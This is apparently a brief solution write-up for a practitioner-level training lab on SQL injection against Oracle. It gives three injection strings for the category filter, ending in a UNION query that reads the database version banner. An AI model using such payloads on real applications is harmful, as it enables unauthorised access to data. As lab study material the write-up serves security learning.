Title: SQL injection attack, querying the database type and version on Oracle
Level: Practitioner
Desc:  This lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.
To solve the lab, display the database version string. 

`category=Lifestyle' or 1=1--`
![image](https://github.com/user-attachments/assets/b152d947-178b-4e8a-b223-cafb5ad8f30a)

`category=Lifestyle' or 1=1 UNION SELECT NULL,NULL from DUAL--`
![image](https://github.com/user-attachments/assets/7c89574a-e769-413e-b9a8-fb4171210f37)

`category=Lifestyle' or 1=1 UNION SELECT '1',banner from v$version--`
![image](https://github.com/user-attachments/assets/5b47bd19-faf1-49dc-b5e3-a9d5cf3d4d3f)
